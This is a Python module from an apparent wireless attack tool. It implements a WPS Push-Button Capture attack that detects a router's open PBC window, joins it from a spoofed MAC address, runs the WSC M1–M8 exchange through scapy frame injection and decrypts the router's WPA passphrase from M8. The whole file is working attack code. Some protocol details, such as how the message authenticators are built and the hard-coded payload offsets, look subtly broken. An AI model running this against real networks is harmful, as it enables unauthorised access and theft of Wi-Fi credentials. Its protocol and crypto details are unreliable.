#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""WPS PushButton Capture (PBC) attack.

When someone presses a router's WPS button it enters Registrar mode and will
hand its PSK to any Enrollee that completes WSC within ~120 seconds. We play
the Enrollee, and the PSK arrives in M8's Encrypted Settings credential.

PBC has no secret: the device password is the public constant '00000000', so
both sides derive the same PSK1/PSK2 and our E-hashes verify. This is why it
must be active — a passive capture can't derive the DH session key.

Transport layer: scapy for 802.11 / EAPOL frame building and injection.
A full WSC state machine is complex; this implementation drives the M1–M8
exchange using the WPS IE 'Selected Registrar' flag in beacons as the trigger.

Requirements: scapy

Detection:
  An AP whose WPS IE has 'Selected Registrar = 1' has been button-pressed. We
  detect this by parsing the WPS IE in Probe Responses / Beacons and watch
  during the scanner phase for the flag to appear.

Ported/adapted from wifit3/campaigns/wps/enrollee.py (GPLv2).
"""

from __future__ import annotations

import hashlib
import hmac
import os
import re
import struct
import time
from typing import Optional, Tuple

from ..config import Configuration
from ..util.color import Color
from ..model.wps_result import CrackResultWPS

# ---------------------------------------------------------------------------
# Scapy availability
# ---------------------------------------------------------------------------
try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Auth, Dot11AssoReq, Dot11Elt,
        EAPOL, EAP, sendp, sniff, conf as scapy_conf,
    )
    _SCAPY_AVAILABLE = True
except ImportError:
    _SCAPY_AVAILABLE = False


# ---------------------------------------------------------------------------
# WSC / EAP constants
# ---------------------------------------------------------------------------

EAP_CODE_REQUEST  = 1
EAP_CODE_RESPONSE = 2
EAP_TYPE_IDENTITY = 1
EAP_TYPE_EXPANDED = 254     # EAP-WSC
WSC_OUI           = b'\x00\x37\x2a'
WSC_VENDOR_TYPE   = b'\x00\x00\x00\x01'

WPS_OPCODE_WSC_START = 0x01
WPS_OPCODE_WSC_MSG   = 0x04
WPS_OPCODE_WSC_ACK   = 0x0c
WPS_OPCODE_WSC_NACK  = 0x0e
WPS_OPCODE_WSC_DONE  = 0x05

# WPS attribute IDs
WPS_ATTR_VERSION         = 0x104A
WPS_ATTR_MSG_TYPE        = 0x1022
WPS_ATTR_UUID_E          = 0x1047
WPS_ATTR_MAC             = 0x1020
WPS_ATTR_ENROLLEE_NONCE  = 0x101A
WPS_ATTR_REGISTRAR_NONCE = 0x1039
WPS_ATTR_PUBLIC_KEY      = 0x1032
WPS_ATTR_AUTH_TYPE_FLAGS = 0x1004
WPS_ATTR_ENCR_TYPE_FLAGS = 0x1010
WPS_ATTR_CONN_TYPE_FLAGS = 0x100D
WPS_ATTR_CONFIG_METHODS  = 0x1008
WPS_ATTR_WPS_STATE       = 0x1044
WPS_ATTR_MANUFACTURER    = 0x1021
WPS_ATTR_MODEL_NAME      = 0x1023
WPS_ATTR_MODEL_NUMBER    = 0x1024
WPS_ATTR_SERIAL_NUM      = 0x1042
WPS_ATTR_PRIMARY_DEVICE  = 0x1054
WPS_ATTR_DEVICE_NAME     = 0x1011
WPS_ATTR_RF_BANDS        = 0x103C
WPS_ATTR_ASSOC_STATE     = 0x1002
WPS_ATTR_DEVICE_PASSWD   = 0x1012
WPS_ATTR_CONFIG_ERROR    = 0x1009
WPS_ATTR_OS_VERSION      = 0x102D
WPS_ATTR_NETWORK_KEY     = 0x1027
WPS_ATTR_SSID            = 0x1045
WPS_ATTR_AUTH_TYPE        = 0x1003
WPS_ATTR_ENCR_TYPE        = 0x100F
WPS_ATTR_KEY_WRAP_AUTH   = 0x101E
WPS_ATTR_ENCRYPTED_SETTINGS = 0x1018
WPS_ATTR_AUTHENTICATOR   = 0x1005
WPS_ATTR_E_HASH1         = 0x1014
WPS_ATTR_E_HASH2         = 0x1015
WPS_ATTR_E_SNONCE1       = 0x104B
WPS_ATTR_E_SNONCE2       = 0x104C

MSG_M1 = 0x04
MSG_M2 = 0x05
MSG_M3 = 0x07
MSG_M4 = 0x08
MSG_M5 = 0x09
MSG_M6 = 0x0A
MSG_M7 = 0x0B
MSG_M8 = 0x0C

PBC_PASSWORD = b'00000000'  # The public WPS PBC device password


# ---------------------------------------------------------------------------
# TLV helpers
# ---------------------------------------------------------------------------

def _tlv(attr_id: int, data: bytes) -> bytes:
    return struct.pack('!HH', attr_id, len(data)) + data


def _parse_tlvs(data: bytes):
    attrs = {}
    pos = 0
    while pos + 4 <= len(data):
        attr_id = struct.unpack('!H', data[pos:pos+2])[0]
        attr_len = struct.unpack('!H', data[pos+2:pos+4])[0]
        pos += 4
        attrs[attr_id] = data[pos:pos+attr_len]
        pos += attr_len
    return attrs


# ---------------------------------------------------------------------------
# DH key exchange (WPS uses the 1536-bit MODP group from RFC 3526)
# ---------------------------------------------------------------------------

_DH_P = int(
    'FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1'
    '29024E088A67CC74020BBEA63B139B22514A08798E3404DD'
    'EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245'
    'E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED'
    'EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D'
    'C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F'
    '83655D23DCA3AD961C62F356208552BB9ED529077096966D'
    '670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B'
    'E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9'
    'DE2BCBF6955817183995497CEA956AE515D2261898FA0510'
    '15728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64'
    'ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7'
    'ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6B'
    'F12FFA06D98A0864D87602733EC86A64521F2B18177B200C'
    'BBE117577A615D6C770988C0BAD946E208E24FA074E5AB31'
    '43DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF', 16
)
_DH_G = 2


def _dh_generate():
    """Generate a DH private key and public key."""
    priv = int.from_bytes(os.urandom(192), 'big') % (_DH_P - 2) + 1
    pub  = pow(_DH_G, priv, _DH_P)
    return priv, pub.to_bytes(192, 'big')


def _dh_shared(priv: int, peer_pub_bytes: bytes) -> bytes:
    peer_pub = int.from_bytes(peer_pub_bytes, 'big')
    shared   = pow(peer_pub, priv, _DH_P)
    return shared.to_bytes(192, 'big')


# ---------------------------------------------------------------------------
# WSC crypto
# ---------------------------------------------------------------------------

def _kdf(key: bytes, label: bytes, bits: int) -> bytes:
    """WPS KDF (PRF based on HMAC-SHA-256)."""
    result = b''
    i = 1
    while len(result) * 8 < bits:
        result += hmac.new(key,
            struct.pack('!I', i) + label + b'\x00' + struct.pack('!I', bits),
            hashlib.sha256).digest()
        i += 1
    return result[:bits // 8]


def _derive_keys(dh_shared: bytes, enrollee_nonce: bytes, registrar_nonce: bytes,
                 enrollee_mac: bytes):
    """Derive AuthKey, KeyWrapKey, EMSK from DH shared secret."""
    kdk_input = enrollee_nonce + enrollee_mac + registrar_nonce
    kdk = hmac.new(hashlib.sha256(dh_shared).digest(), kdk_input, hashlib.sha256).digest()
    keys = _kdf(kdk, b'Wi-Fi Easy and Secure Key Derivation', 640)
    auth_key      = keys[0:32]
    key_wrap_key  = keys[32:48]
    emsk          = keys[48:80]
    return auth_key, key_wrap_key, emsk


def _hmac_sha256(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()


def _aes_decrypt(key: bytes, data: bytes) -> bytes:
    """AES-128-CBC decrypt (requires pycryptodome or cryptography)."""
    try:
        from Crypto.Cipher import AES
        iv = data[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return cipher.decrypt(data[16:])
    except ImportError:
        pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        iv = data[:16]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        d = cipher.decryptor()
        return d.update(data[16:]) + d.finalize()
    except ImportError:
        raise RuntimeError('pycryptodome or cryptography is required for WPS PBC. '
                           'Install with: pip install pycryptodome')


# ---------------------------------------------------------------------------
# EAP frame builders
# ---------------------------------------------------------------------------

def _eap_response(eap_id: int, eap_type: int, data: bytes = b'') -> bytes:
    """Build a raw EAP Response frame."""
    payload = bytes([EAP_CODE_RESPONSE, eap_id, 0, 0, eap_type]) + data
    length = len(payload)
    payload = payload[:2] + struct.pack('!H', length) + payload[4:]
    return payload


def _eap_wsc_response(eap_id: int, opcode: int, wsc_data: bytes) -> bytes:
    """Build an EAP-WSC (Expanded) Response frame."""
    expanded_data = (
        WSC_OUI + WSC_VENDOR_TYPE
        + bytes([opcode, 0x00])   # opcode, flags
        + wsc_data
    )
    return _eap_response(eap_id, EAP_TYPE_EXPANDED, expanded_data)


def _build_eapol_frame(ap_mac: str, our_mac: str, eap_payload: bytes) -> bytes:
    """Wrap an EAP frame in EAPOL inside an 802.11 Data frame (scapy)."""
    from scapy.all import RadioTap, Dot11, Dot11QoS, LLC, SNAP, Raw
    frame = (
        RadioTap()
        / Dot11(addr1=ap_mac, addr2=our_mac, addr3=ap_mac, type=2, subtype=8)
        / bytes([0x00, 0x00])   # QoS Control
        / bytes([0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E])  # LLC/SNAP for EAPOL
        / eap_payload
    )
    return bytes(frame)


# ---------------------------------------------------------------------------
# Main attack class
# ---------------------------------------------------------------------------

class AttackWPSPBC:
    """WPS PBC (Push-Button) PSK extraction.

    Detects the WPS 'Selected Registrar' flag in beacon/probe-response WPS IEs,
    then drives the WSC enrollee exchange (M1→M8) to extract the PSK.

    Requires: scapy, pycryptodome or cryptography.
    """

    def __init__(self, target):
        self.target = target
        self.crack_result: Optional[CrackResultWPS] = None
        self.success = False
        self._iface = Configuration.interface

    @staticmethod
    def is_available() -> bool:
        return _SCAPY_AVAILABLE

    @staticmethod
    def is_pbc_active(target) -> bool:
        """Check if the target's WPS beacon IE has Selected Registrar = 1.

        Returns True if the target has the PBC window active.
        This is set by the scanner when parsing WPS IEs from beacon frames.
        """
        return getattr(target, 'wps_pbc_active', False)

    def run(self) -> bool:
        """Run the PBC attack. Returns True if PSK was extracted."""
        if not _SCAPY_AVAILABLE:
            Color.pl('{!} {O}WPS PBC: scapy not available — install with: pip install scapy{W}')
            return False

        Color.pl('{+} {C}WPS PBC{W}: Starting Push-Button capture against {C}%s{W}' %
                 self.target.essid)
        Color.pl('{!} {O}Waiting for AP PBC window (press the WPS button on the router){W}')

        # Poll for PBC window (up to 120 seconds — the standard PBC walk time)
        deadline = time.time() + 120
        while time.time() < deadline:
            remaining = int(deadline - time.time())
            Color.p('\r{+} {C}WPS PBC{W}: Waiting for button press... ({O}%ds{W} remaining)   ' %
                    remaining)
            if self._detect_pbc_active():
                Color.pl('\n{+} {G}PBC window detected!{W} Starting WSC exchange...')
                return self._run_exchange()
            time.sleep(2)

        Color.pl('\n{!} {R}WPS PBC: timed out waiting for button press{W}')
        return False

    def _detect_pbc_active(self) -> bool:
        """Sniff for a beacon from target with WPS Selected Registrar = 1."""
        if not _SCAPY_AVAILABLE:
            return False
        try:
            from scapy.all import Dot11Beacon, Dot11Elt

            def is_pbc_beacon(pkt):
                if not pkt.haslayer(Dot11Beacon):
                    return False
                if pkt[Dot11].addr3.lower() != self.target.bssid.lower():
                    return False
                return _has_selected_registrar(pkt)

            pkts = sniff(iface=self._iface, lfilter=is_pbc_beacon, timeout=2, count=1)
            return len(pkts) > 0
        except Exception:
            return getattr(self.target, 'wps_pbc_active', False)

    def _run_exchange(self) -> bool:
        """Drive the WSC M1–M8 exchange. Returns True on PSK extraction."""
        ap_mac  = self.target.bssid
        our_mac = _random_client_mac()
        essid   = self.target.essid or ''

        try:
            scapy_conf.verb = 0

            # Step 1: Authenticate + Associate
            Color.p('{+} {C}WPS PBC{W}: Authenticating...  ')
            if not self._auth_assoc(ap_mac, our_mac, essid):
                Color.pl('{R}failed{W}')
                return False
            Color.pl('{G}associated{W}')

            # Step 2: EAP Identity Exchange
            Color.p('{+} {C}WPS PBC{W}: EAP Identity...    ')
            eap_id = self._eap_identity(ap_mac, our_mac)
            if eap_id is None:
                Color.pl('{R}no EAP request{W}')
                return False
            Color.pl('{G}ok{W}')

            # Step 3: WSC M1→M8 exchange
            Color.p('{+} {C}WPS PBC{W}: WSC exchange...    ')
            psk, ssid = self._wsc_exchange(ap_mac, our_mac, eap_id)
            if psk is None:
                Color.pl('{R}failed{W}')
                return False

            Color.pl('{G}success!{W}')
            Color.pl('\n{+} {G}WPS PBC cracked!{W}')
            Color.pl('    SSID: {C}%s{W}' % (ssid or essid))
            Color.pl('    PSK:  {G}%s{W}' % psk)

            self.crack_result = CrackResultWPS(
                bssid=ap_mac,
                essid=ssid or essid,
                pin='PBC',
                psk=psk,
            )
            self.success = True
            return True

        except RuntimeError as e:
            Color.pl('\n{!} {R}WPS PBC error: %s{W}' % str(e))
            return False
        except Exception as e:
            if Configuration.verbose > 0:
                import traceback
                Color.pl('\n{!} WPS PBC exception: %s' % traceback.format_exc())
            return False

    def _auth_assoc(self, ap_mac: str, our_mac: str, essid: str) -> bool:
        """Open auth + associate to get EAP frames."""
        auth = (
            RadioTap()
            / Dot11(addr1=ap_mac, addr2=our_mac, addr3=ap_mac)
            / Dot11Auth(algo=0, seqnum=1, status=0)
        )
        sendp(auth, iface=self._iface, count=2, verbose=False)
        time.sleep(0.1)

        resp = sniff(iface=self._iface,
                     lfilter=lambda p: (p.haslayer(Dot11Auth)
                                        and p[Dot11].addr1 == our_mac
                                        and p[Dot11].addr3 == ap_mac
                                        and p[Dot11Auth].seqnum == 2),
                     timeout=2, count=1)
        if not resp:
            return False

        assoc = (
            RadioTap()
            / Dot11(addr1=ap_mac, addr2=our_mac, addr3=ap_mac)
            / Dot11AssoReq(cap=0x0431, listen_interval=10)
            / Dot11Elt(ID='SSID', info=essid)
            / Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x24\x30\x48\x6c')
        )
        sendp(assoc, iface=self._iface, count=2, verbose=False)
        time.sleep(0.3)
        return True

    def _eap_identity(self, ap_mac: str, our_mac: str) -> Optional[int]:
        """Wait for EAP-Request/Identity and respond. Returns EAP ID."""
        pkts = sniff(iface=self._iface,
                     lfilter=lambda p: (p.haslayer(EAPOL)
                                        and p[Dot11].addr1 == our_mac),
                     timeout=3, count=1)
        if not pkts:
            return None

        raw_eap = bytes(pkts[0][EAPOL])
        if len(raw_eap) < 5:
            return None
        eap_id = raw_eap[1]  # EAP ID field

        # Send EAP-Response/Identity: "WFA-SimpleConfig-Enrollee-1-0"
        identity = b'WFA-SimpleConfig-Enrollee-1-0'
        resp = _eap_response(eap_id, EAP_TYPE_IDENTITY, identity)
        frame = _build_eapol_with_raw(ap_mac, our_mac, resp)
        sendp(frame, iface=self._iface, count=1, verbose=False)
        return eap_id

    def _wsc_exchange(self, ap_mac: str, our_mac: str,
                       eap_id: int) -> Tuple[Optional[str], Optional[str]]:
        """Run M1→M8 and extract PSK. Returns (psk, ssid) or (None, None)."""
        our_mac_bytes = _mac_bytes(our_mac)
        priv, pke = _dh_generate()
        nonce_e   = os.urandom(16)
        uuid_e    = os.urandom(16)
        e_s1      = os.urandom(16)
        e_s2      = os.urandom(16)

        # --- M1 ---
        m1_data = (
            _tlv(WPS_ATTR_VERSION,         b'\x10')
            + _tlv(WPS_ATTR_MSG_TYPE,      bytes([MSG_M1]))
            + _tlv(WPS_ATTR_UUID_E,        uuid_e)
            + _tlv(WPS_ATTR_MAC,           our_mac_bytes)
            + _tlv(WPS_ATTR_ENROLLEE_NONCE, nonce_e)
            + _tlv(WPS_ATTR_PUBLIC_KEY,    pke)
            + _tlv(WPS_ATTR_AUTH_TYPE_FLAGS, b'\x00\x22')    # WPA2-Personal + Open
            + _tlv(WPS_ATTR_ENCR_TYPE_FLAGS, b'\x00\x0C')    # AES + TKIP
            + _tlv(WPS_ATTR_CONN_TYPE_FLAGS, b'\x01')
            + _tlv(WPS_ATTR_CONFIG_METHODS, b'\x00\x88')     # PBC
            + _tlv(WPS_ATTR_WPS_STATE,     b'\x01')
            + _tlv(WPS_ATTR_MANUFACTURER,  b'wifi-shadow')
            + _tlv(WPS_ATTR_MODEL_NAME,    b'wifi-shadow')
            + _tlv(WPS_ATTR_MODEL_NUMBER,  b'1')
            + _tlv(WPS_ATTR_SERIAL_NUM,    b'1')
            + _tlv(WPS_ATTR_PRIMARY_DEVICE, b'\x00\x0A\x00\x50\xF2\x04\x00\x08\x00\x00')
            + _tlv(WPS_ATTR_DEVICE_NAME,   b'wifi-shadow')
            + _tlv(WPS_ATTR_RF_BANDS,      b'\x03')           # 2.4+5 GHz
            + _tlv(WPS_ATTR_ASSOC_STATE,   b'\x00\x01')
            + _tlv(WPS_ATTR_DEVICE_PASSWD, b'\x00\x04')       # PBC password ID
            + _tlv(WPS_ATTR_CONFIG_ERROR,  b'\x00\x00')
            + _tlv(WPS_ATTR_OS_VERSION,    b'\x80\x00\x00\x00')
        )
        self._send_wsc(ap_mac, our_mac, eap_id, WPS_OPCODE_WSC_MSG, m1_data)

        # --- Wait for M2 ---
        m2_raw = self._recv_wsc(our_mac, timeout=5)
        if m2_raw is None:
            return None, None

        m2_attrs = _parse_tlvs(m2_raw)
        if m2_attrs.get(WPS_ATTR_MSG_TYPE, b'')[0:1] != bytes([MSG_M2]):
            return None, None

        pkr        = m2_attrs.get(WPS_ATTR_PUBLIC_KEY, b'')
        nonce_r    = m2_attrs.get(WPS_ATTR_REGISTRAR_NONCE, b'')

        if not pkr or not nonce_r:
            return None, None

        # Derive keys
        dh_secret = _dh_shared(priv, pkr)
        auth_key, key_wrap_key, emsk = _derive_keys(
            dh_secret, nonce_e, nonce_r, our_mac_bytes
        )

        # --- E-Hashes (PBC: device password = '00000000') ---
        psk1 = _hmac_sha256(auth_key, PBC_PASSWORD[:4])[:16]
        psk2 = _hmac_sha256(auth_key, PBC_PASSWORD[4:])[:16]

        e_hash1 = _hmac_sha256(auth_key, psk1 + e_s1 + pke + pkr)
        e_hash2 = _hmac_sha256(auth_key, psk2 + e_s2 + pke + pkr)

        # --- M3 ---
        m3_data = (
            _tlv(WPS_ATTR_VERSION,    b'\x10')
            + _tlv(WPS_ATTR_MSG_TYPE, bytes([MSG_M3]))
            + _tlv(WPS_ATTR_REGISTRAR_NONCE, nonce_r)
            + _tlv(WPS_ATTR_E_HASH1,  e_hash1)
            + _tlv(WPS_ATTR_E_HASH2,  e_hash2)
        )
        m3_auth = _hmac_sha256(auth_key, m1_data + m2_raw + m3_data)[:8]
        m3_data += _tlv(WPS_ATTR_AUTHENTICATOR, m3_auth)
        self._send_wsc(ap_mac, our_mac, eap_id, WPS_OPCODE_WSC_MSG, m3_data)

        # --- M4 (skip detailed processing — we just need M5 to confirm half) ---
        m4_raw = self._recv_wsc(our_mac, timeout=5)
        if m4_raw is None:
            return None, None

        # --- M5 with E-SNonce1 ---
        e_s1_enc = self._encrypt_snonce(key_wrap_key, auth_key, e_s1,
                                         WPS_ATTR_E_SNONCE1)
        m5_data = (
            _tlv(WPS_ATTR_VERSION,    b'\x10')
            + _tlv(WPS_ATTR_MSG_TYPE, bytes([MSG_M5]))
            + _tlv(WPS_ATTR_REGISTRAR_NONCE, nonce_r)
            + _tlv(WPS_ATTR_ENCRYPTED_SETTINGS, e_s1_enc)
        )
        m5_auth = _hmac_sha256(auth_key, m2_raw + m3_data + m4_raw + m5_data)[:8]
        m5_data += _tlv(WPS_ATTR_AUTHENTICATOR, m5_auth)
        self._send_wsc(ap_mac, our_mac, eap_id, WPS_OPCODE_WSC_MSG, m5_data)

        # --- M6 ---
        m6_raw = self._recv_wsc(our_mac, timeout=5)
        if m6_raw is None:
            return None, None

        # --- M7 with E-SNonce2 ---
        e_s2_enc = self._encrypt_snonce(key_wrap_key, auth_key, e_s2,
                                         WPS_ATTR_E_SNONCE2)
        m7_data = (
            _tlv(WPS_ATTR_VERSION,    b'\x10')
            + _tlv(WPS_ATTR_MSG_TYPE, bytes([MSG_M7]))
            + _tlv(WPS_ATTR_REGISTRAR_NONCE, nonce_r)
            + _tlv(WPS_ATTR_ENCRYPTED_SETTINGS, e_s2_enc)
        )
        m7_auth = _hmac_sha256(auth_key, m4_raw + m5_data + m6_raw + m7_data)[:8]
        m7_data += _tlv(WPS_ATTR_AUTHENTICATOR, m7_auth)
        self._send_wsc(ap_mac, our_mac, eap_id, WPS_OPCODE_WSC_MSG, m7_data)

        # --- M8 (contains encrypted PSK) ---
        m8_raw = self._recv_wsc(our_mac, timeout=5)
        if m8_raw is None:
            return None, None

        return self._extract_psk_from_m8(m8_raw, key_wrap_key, auth_key)

    def _encrypt_snonce(self, key_wrap_key: bytes, auth_key: bytes,
                         snonce: bytes, snonce_attr_id: int) -> bytes:
        """Build an Encrypted Settings KDE containing an E-SNonce."""
        from Crypto.Cipher import AES as _AES
        from Crypto.Util.Padding import pad

        plaintext = _tlv(snonce_attr_id, snonce)
        kwa = _hmac_sha256(auth_key, plaintext)[:8]
        plaintext += _tlv(WPS_ATTR_KEY_WRAP_AUTH, kwa)

        iv = os.urandom(16)
        cipher = _AES.new(key_wrap_key, _AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, 16))
        return iv + ciphertext

    def _extract_psk_from_m8(self, m8_raw: bytes, key_wrap_key: bytes,
                               auth_key: bytes) -> Tuple[Optional[str], Optional[str]]:
        """Decrypt M8 Encrypted Settings and extract SSID + Network Key."""
        attrs = _parse_tlvs(m8_raw)
        enc_settings = attrs.get(WPS_ATTR_ENCRYPTED_SETTINGS)
        if not enc_settings:
            return None, None

        try:
            plaintext = _aes_decrypt(key_wrap_key, enc_settings)
        except Exception:
            return None, None

        cred_attrs = _parse_tlvs(plaintext)
        ssid = cred_attrs.get(WPS_ATTR_SSID, b'').decode('utf-8', errors='replace')
        psk  = cred_attrs.get(WPS_ATTR_NETWORK_KEY, b'').decode('utf-8', errors='replace')

        if not psk:
            return None, None
        return psk, ssid

    def _send_wsc(self, ap_mac: str, our_mac: str, eap_id: int,
                   opcode: int, wsc_data: bytes) -> None:
        eap_payload = _eap_wsc_response(eap_id, opcode, wsc_data)
        frame = _build_eapol_with_raw(ap_mac, our_mac, eap_payload)
        sendp(frame, iface=self._iface, count=1, verbose=False)

    def _recv_wsc(self, our_mac: str, timeout: float = 3.0) -> Optional[bytes]:
        """Receive the next WSC message frame addressed to us."""
        pkts = sniff(
            iface=self._iface,
            lfilter=lambda p: (p.haslayer(EAPOL) and p[Dot11].addr1 == our_mac),
            timeout=timeout,
            count=1,
        )
        if not pkts:
            return None

        raw = bytes(pkts[0][EAPOL])
        # EAP-WSC payload starts after EAP header (4B) + Expanded header (8B)
        # Version(1) + Type(1) + Length(2) + expanded_type(1) + OUI(3) + vendor(4) + opcode(1) + flags(1)
        if len(raw) < 16:
            return None
        return raw[16:]  # WSC TLV payload


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _random_client_mac() -> str:
    raw = bytearray(os.urandom(6))
    raw[0] = (raw[0] | 0x02) & 0xFE
    return ':'.join('%02x' % b for b in raw)


def _mac_bytes(mac: str) -> bytes:
    return bytes(int(b, 16) for b in mac.split(':'))


def _has_selected_registrar(pkt) -> bool:
    """Parse WPS IE in a beacon/probe-response to check Selected Registrar."""
    try:
        from scapy.all import Dot11Elt
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 221:  # Vendor-Specific
                info = bytes(elt.info)
                if info[:4] == b'\x00\x50\xf2\x04':  # Microsoft WPS OUI
                    # Parse WPS TLVs
                    attrs = _parse_tlvs(info[4:])
                    sel_reg = attrs.get(0x1041)  # Selected Registrar attribute
                    if sel_reg and sel_reg[0] == 0x01:
                        return True
            elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None
    except Exception:
        pass
    return False


def _build_eapol_with_raw(ap_mac: str, our_mac: str, eap_payload: bytes):
    """Build an 802.11 Data frame carrying an EAPOL/EAP payload (scapy)."""
    from scapy.all import RadioTap, Dot11, Raw
    # EAPOL header (version=1, type=0 for EAP, length)
    eapol_hdr = struct.pack('!BBH', 0x01, 0x00, len(eap_payload))
    llc_snap   = b'\xAA\xAA\x03\x00\x00\x00\x88\x8E'  # LLC + SNAP for 0x888E (EAPOL)
    return (
        RadioTap()
        / Dot11(addr1=ap_mac, addr2=our_mac, addr3=ap_mac, type=2, subtype=0)
        / Raw(load=llc_snap + eapol_hdr + eap_payload)
    )
